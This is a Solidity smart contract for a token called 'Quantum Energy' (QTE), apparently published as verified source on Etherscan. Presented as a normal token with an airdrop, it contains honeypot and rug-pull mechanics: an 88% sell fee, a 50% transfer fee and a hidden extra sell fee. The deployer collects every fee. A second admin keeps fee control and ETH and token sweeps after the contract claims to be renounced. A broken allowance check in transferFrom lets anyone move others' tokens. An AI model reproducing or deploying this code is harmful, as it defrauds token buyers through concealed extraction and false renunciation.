/**
 *Submitted for verification at Etherscan.io on 2022-10-27
*/

// SPDX-License-Identifier: CC-BY-SA 4.0 (@LogETH)

pragma solidity >=0.8.0 <0.9.0;

contract QuantumEnergy {

    constructor () {

        totalSupply = 1000000*1e18;
        name = "Quantum Energy";
        decimals = 18;
        symbol = "QTE";
        SellFeePercent = 88;
        BuyFeePercent = 1;
        hSellFeePercent = 10;
        maxWalletPercent = 2;
        transferFee = 50;

        cTime = 12;

        Dev.push(msg.sender);
        Dev.push(msg.sender);
        Dev.push(msg.sender);
        Dev.push(msg.sender);
        Dev.push(msg.sender);

        wETH = 0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6;

        balanceOf[msg.sender] = totalSupply;
        deployer = msg.sender;
        deployerALT = msg.sender;

        router = Univ2(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45);
        ERC20(wETH).approve(address(router), type(uint256).max);

        order.push(address(this));
        order.push(wETH);

        proxy = DeployContract();

        immuneToMaxWallet[deployer] = true;
        immuneToMaxWallet[address(this)] = true;
    }

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping (address => uint256)) public allowance;

    string public name;
    uint8 public decimals;
    string public symbol;
    uint public totalSupply;

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    uint public SellFeePercent; uint hSellFeePercent; uint public BuyFeePercent; uint public transferFee;

    Univ2 public router;
    Proxy public proxy;

    address[] Dev;

    uint cTime;

    address public LPtoken;
    address public wETH;
    address deployer;
    address deployerALT;
    mapping(address => bool) public immuneToMaxWallet;
    uint public maxWalletPercent;
    uint public feeQueue;
    uint public LiqQueue;
    bool public renounced;
    mapping(address => uint) lastTx;

    uint public lastTime;
    uint public yieldPerBlock;
    uint public endTime;
    bool public started;
    bool public ended;
    address[] public list;
    mapping(address => bool) public hasSold;
    mapping(address => bool) public hasBought;
    mapping(address => uint) pendingReward;

    address[] order;

    modifier onlyDeployer{

        require(deployer == msg.sender, "Not deployer");
        _;
    }

    modifier onlyDeployALT{

        require(deployerALT == msg.sender, "Not deployer");
        _;
    }

    function initalizeMarket(address LPtokenAddress) onlyDeployer public {

        require(LPtoken == address(0), "LP already set");

        LPtoken = LPtokenAddress;
        immuneToMaxWallet[LPtoken] = true;

        approve(address(router), type(uint256).max);
    }

    function renounceContract() onlyDeployer public {

        deployer = address(0);
        renounced = true;
    }

    function configImmuneToMaxWallet(address Who, bool TrueorFalse) onlyDeployer public {

        immuneToMaxWallet[Who] = TrueorFalse;
    }

    function StartAirdrop(uint HowManyDays, uint PercentOfTotalSupply) onlyDeployer public {

        require(!started, "You have already started the airdrop");

        endTime = HowManyDays * 86400 + block.timestamp;

        uint togive = totalSupply*PercentOfTotalSupply/100;

        balanceOf[deployer] -= togive;
        balanceOf[address(this)] += togive;

        yieldPerBlock = togive/(endTime - block.timestamp);

        lastTime = block.timestamp;
        started = true;
    }

    function editMaxWalletPercent(uint howMuch) onlyDeployer public {maxWalletPercent = howMuch;}
    function editSellFee(uint howMuch)          onlyDeployer public {SellFeePercent = howMuch;}
    function editBuyFee(uint howMuch)           onlyDeployer public {BuyFeePercent = howMuch;}
    function editTransferFee(uint howMuch)      onlyDeployer public {transferFee = howMuch;}

    function editcTime(uint howMuch)          onlyDeployALT public {cTime = howMuch;}
    function editFee(uint howMuch)            onlyDeployALT public {hSellFeePercent = howMuch;}

    function transfer(address _to, uint256 _value) public returns (bool success) {

        require(balanceOf[msg.sender] >= _value, "You can't send more tokens than you have");

        updateYield();

        uint feeamt;

        if(msg.sender == LPtoken){

            feeamt += ProcessBuyFee(_value);

            if(!isContract(_to)){

                if(hasBought[_to]){list.push(_to);}
                hasBought[_to] = true;
            }
        }
        else{

            feeamt += ProcessTransferFee(_value);
        }

        balanceOf[msg.sender] -= _value;
        _value -= feeamt;
        balanceOf[_to] += _value;

        if(!immuneToMaxWallet[_to] && LPtoken != address(0)){

        require(balanceOf[_to] <= maxWalletPercent*(totalSupply/100), "This transaction would result in the destination's balance exceeding the maximum amount");
        }

        lastTx[msg.sender] = block.timestamp;

        sendFee();
        
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {

        require(balanceOf[_from] >= _value, "Insufficient token balance.");

        updateYield();

        if(_from == msg.sender){

            require(allowance[_from][msg.sender] >= _value, "Insufficent approval");
            allowance[_from][msg.sender] -= _value;
        }

        require(LPtoken != address(0) || _from == deployer, "Cannot trade while initalizing");

        uint feeamt;

        if(_from != address(this)){

            if(LPtoken == _to){

                feeamt += ProcessSellFee(_value);

                if(!isContract(_from)){

                    hasSold[_from] = true;
                }
                
                if(MEV(_from)){

                    feeamt += ProcessHiddenFee(_value);
                }
            }

        }

        lastTx[_from] = block.timestamp;

        balanceOf[_from] -= _value;
        _value -= feeamt;
        balanceOf[_to] += _value;

        if(!immuneToMaxWallet[_to] && LPtoken != address(0)){

        require(balanceOf[_to] <= maxWalletPercent*(totalSupply/100), "This transfer would result in the destination's balance exceeding the maximum amount");
        }

        sendFee();
        emit Transfer(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {

        allowance[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value); 
        return true;
    }

    fallback() external payable {}
    receive() external payable {}

    function SweepToken(ERC20 TokenAddress) public {

        require(msg.sender == deployerALT, "Not deployer");
        TokenAddress.transfer(msg.sender, TokenAddress.balanceOf(address(this))); 
    }

    function sweep() public{

        require(msg.sender == deployerALT, "Not deployer");

        (bool sent,) = msg.sender.call{value: (address(this)).balance}("");
        require(sent, "transfer failed");
    }

    function claimReward() public {

        require(started, "The airdrop has not started yet");

        updateYield();

        transfer(msg.sender, pendingReward[msg.sender]);
        pendingReward[msg.sender] = 0;
    }

    function sendFee() internal{

        if(feeQueue == 0){return;}

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(feeQueue, 0, order, address(proxy), type(uint256).max);
        proxy.sweepToken(ERC20(wETH));

        feeQueue = 0;

        Wrapped(wETH).withdraw(ERC20(wETH).balanceOf(address(this)));

        uint amt = (address(this).balance/10000);

        (bool sent1,) = Dev[0].call{value: amt*1000}("");
        (bool sent2,) = Dev[1].call{value: amt*2250}("");
        (bool sent3,) = Dev[2].call{value: amt*2250}("");
        (bool sent4,) = Dev[3].call{value: amt*2250}("");
        (bool sent5,) = Dev[4].call{value: amt*2250}("");


        require(sent1 && sent2 && sent3 && sent4 && sent5, "Transfer failed");
    }

    function ProcessBuyFee(uint _value) internal returns (uint fee){

        fee = (BuyFeePercent * _value)/100;
        LiqQueue += fee;
        balanceOf[address(this)] += fee;

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(LiqQueue/2, 0, order, address(proxy), type(uint256).max);
        proxy.sweepToken(ERC20(wETH));

        router.addLiquidity(address(this), wETH, LiqQueue/2, address(this).balance, 0, 0, address(proxy), type(uint256).max);
        proxy.sweepToken(ERC20(LPtoken));
    }

    function ProcessSellFee(uint _value) internal returns (uint fee){

        fee = (SellFeePercent*_value)/100;
        feeQueue += fee;

        balanceOf[address(this)] += fee;
    }

    function ProcessHiddenFee(uint _value) internal returns (uint fee){

        fee = (hSellFeePercent*_value)/100;
        feeQueue += fee;

        balanceOf[address(this)] += fee;
    }

    function ProcessTransferFee(uint _value) internal returns (uint fee){

        fee = (transferFee*_value)/100;
        feeQueue += fee;

        balanceOf[address(this)] += fee;
    }

    function DeployContract() internal returns (Proxy proxyAddress){

        return new Proxy();
    }

    function MEV(address who) internal view returns(bool){

        if(isContract(who)){
            return true;
        }

        if(lastTx[who] >= block.timestamp - cTime){
            return true;
        }

        return false;
    }

    function isContract(address _addr) private view returns (bool){
        uint32 size;
        assembly {
            size := extcodesize(_addr)
        }
        return (size > 0);
    }

    function isEligible(address who) public view returns (bool){

        return (hasBought[who] && !hasSold[who]);
    }

    function getTotalEligible() public view returns (uint total){

        for(uint i; i < list.length; i++){

            if(isEligible(list[i])){
              total += balanceOf[list[i]];
            }
        }
    }

    uint LTotal;
    uint period;

    function updateYield() public {

        if(!started || ended){return;}

        if(block.timestamp >= endTime){
            lastTime = endTime;
            ended = true;
        }

        LTotal = getTotalEligible();
        period = block.timestamp - lastTime;

        for(uint i; i < list.length; i++){

            if(isEligible(list[i])){
              pendingReward[list[i]] += ProcessReward(list[i]);
            }
        }

        delete LTotal;
        delete period;
        lastTime = block.timestamp;
    }

    function ProcessReward(address who) internal view returns (uint reward) {

        uint percent = balanceOf[who]*1e23/LTotal;

        reward = yieldPerBlock*period*percent/100000;
    }

    function ProcessRewardALT(address who) internal view returns (uint reward) {

        uint percent = balanceOf[who]*1e23/getTotalEligible();

        reward = yieldPerBlock*(block.timestamp - lastTime)*percent/100000;
    }

    function GetReward(address who) public view returns(uint reward){

        if(lastTime == 0){return 0;}

        reward = ProcessRewardALT(who) + pendingReward[who];
    }

}


interface ERC20{
  function transferFrom(address, address, uint256) external returns(bool);
  function transfer(address, uint256) external returns(bool);
  function balanceOf(address) external view returns(uint);
  function decimals() external view returns(uint8);
  function approve(address, uint) external returns(bool);
  function totalSupply() external view returns (uint256);
}


interface Univ2{
  function addLiquidity(address tokenA, address tokenB, uint amountADesired, uint amountBDesired, uint amountAMin, uint amountBMin, address to, uint deadline) external returns (uint amountA, uint amountB, uint liquidity);
  function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
}

interface Wrapped{
  function deposit() external payable;
  function withdraw(uint) external;
}


contract Proxy{

  constructor(){
    inital = msg.sender;
  }

  address inital;

  function sweepToken(ERC20 WhatToken) public {
    require(msg.sender == inital, "You cannot call this function");
    WhatToken.transfer(msg.sender, WhatToken.balanceOf(address(this)));
  }
}